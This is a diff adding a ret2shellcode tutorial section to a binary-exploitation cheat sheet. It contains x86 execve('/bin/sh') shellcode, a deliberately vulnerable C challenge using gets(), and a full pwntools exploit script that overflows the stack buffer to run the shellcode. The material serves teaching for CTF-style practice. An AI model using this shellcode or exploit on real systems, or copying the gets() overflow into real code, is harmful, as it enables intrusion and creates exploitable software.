@@ -450,7 +450,166 @@ The `fit` or `flat` function writes the variable value at the specified offset(s
 
 ## ret2shellcode
 
-Coming soon ...
+> What if we have a buffer overflow on the stack but no win function? Where can we go? 
+
+ret2shellcode is the technique of using the controlled return pointer from a buffer overflow to jump to code we control. The next path of enquire is *"How do we get the code there?"*, in short we place it there ourselves.
+
+### A Note On Memory Protections
+
+[Memory protections](https://github.com/Angus-C-git/SecSheets/blob/master/Binary%20Exploitation/Theory/MemoryProtections.md), which are effectively a set of mitigations put in place by compilers like `gcc` and kernels like the linux kernel, are a pain for exploit development that we will explore more later on. For now all you need to know is that if the `NX` (No-Execute) bit or protection is not enabled we can execute code on the stack! You can check the compiler protections put in place on the target binary by running a little tool `checksec` which is included with pwntools. Usage is:
+
++ `checksec <binary>`
+
+The output will resemble the following:
+
+```
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled           <-- if disabled we can execute code in the stack region
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+```
+
+### Shellcode
+
+So if we can execute on the stack that means we can place code on the stack, in say a **buffer** we control, and then return to it using our control of the return pointer, but what should this code look like?
+
+[Shellcode](https://github.com/Angus-C-git/SecSheets/blob/master/Binary%20Exploitation/Theory/Shellcoding.md) is the historic name given to machine code that hackers would use to pop a shell in attacks like this. At a lower level of course machine code is just binary data that the CPU can understand as instructions but if we wind back to higher levels of abstraction machine code is just a string of opcodes. The opcodes themselves correspond to the human readable assembly instructions, a variant of which is featured above. Some really common opcodes you may have seen floating around or certainly will are:
+
++ `\0xCC` SIGTRAP (signal trap code)
++ `\0x90` NOP (no operation)
+
+all of these have assembly equivalents, for example in `x86` the above correspond to:
+
++ `int3` signal trap code
++ `nop` no operation
+
+Ultimately what this means is we can construct turing complete programs with just opcodes although id rather peel my eyes out with a spoon. Which on a happy note brings us back to pwntools our binary exploitation lord and saviour. The `asm()` function is truly a gift and puts the fun back into constructing shellcode to pop a shell (which we would otherwise do with opcodes). The function lets us supply `x86` instructions which will then be converted into a opcode string that we can place on the stack (in this case) to execute our code. 
+
+The following python fragment demonstrates its usage to craft shellcode that will execute the syscall for `exceve('/bin/sh')`:
+
+
+```python
+shellcode = asm('''
+    xor eax, eax
+    push eax     
+
+    push 0x68732f2f   
+    push 0x6e69622f 
+
+    mov ebx, esp   
+    push eax
+
+    push ebx
+    mov ecx, esp
+    mov al, 0xb     
+
+    int 0x80
+''')
+```
+
+Now I know what you are thinking, *"Do I need to be fluent in x86 this dead language from before I walked the face of the high level language earth?"*. Sort of ? No not really ...
+
+A lot of the time we don't need to do anything too wild with our shellcode for example you can see that even a small fragment like the one above is enough to give us a shell on the system. More complex shellcode may open a file and write its contents into a buffer on the stack which we then read from.
+
+### Writing an Exploit With Shellcode
+
+Now lets take a look at a simple ret2shellcode challenge. The reason it is **simple** is because the address of the buffer on the stack that we will place our shellcode into is leaked by the binary. In harder ret2shellcode challenges you may need to leak the buffer address yourself, with say a format string vuln (which we will explore soon), or guess its location.  
+
+#### C Source
+
++ This is the source code for the challenge
+
+```c
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+int 
+hack_me()
+{
+    // chonk
+    char buffer[200];
+
+    printf("Hit me with your best shot @%p\n", &buffer);
+    gets(&buffer);
+
+    return 0;
+}
+
+int 
+main(int argc, char const *argv[])
+{   
+    hack_me();
+    printf("Mission failed");
+    return 0;
+}
+```
+
+When we run the compiled program we receive the following output:
+
+
+```
+Hit me with your best shot @0xffdacae8
+
+```
+
+with an input prompt on the next line. The hex after the @ corresponds to the buffers address on the stack.
+
+#### Exploit
+
+An example exploit for the above binary could be:
+
+```python
+
+from pwn import *
+proc = process('./ret2shellcode')
+
+log.info("Receiving banner...")
+proc.recvuntil("@")
+
+buffer_addr = int(proc.recvuntil("\n", drop=True), 16)
+log.success("Buffer address: " + hex(buffer_addr))
+
+# attach debugger to see in gdb
+# gdb.attach(proc) 
+
+shellcode = asm('''
+    xor eax, eax
+    xor ebx, ebx
+    xor ecx, ecx
+    xor edx, edx
+
+    push eax     
+
+    push 0x68732f2f   
+    push 0x6e69622f 
+
+    mov ebx, esp   
+    push eax
+
+    push ebx
+    mov ecx, esp
+    mov eax, 0xb     
+
+    int 0x80
+''')
+
+# send overflow to test offset to return
+#overflow = cyclic(350)
+offset = cyclic_find("daac")
+
+payload = fit({
+    0: shellcode,
+    offset: p32(buffer_addr)
+})
+
+proc.sendline(payload)
+proc.interactive()
+```
+
+I highly recommend stepping through the exploit with gdb attached and observing how the flow of the program changes to the buffer and watching as the instructions we placed get executed one by one.
 
 ## Resources
 
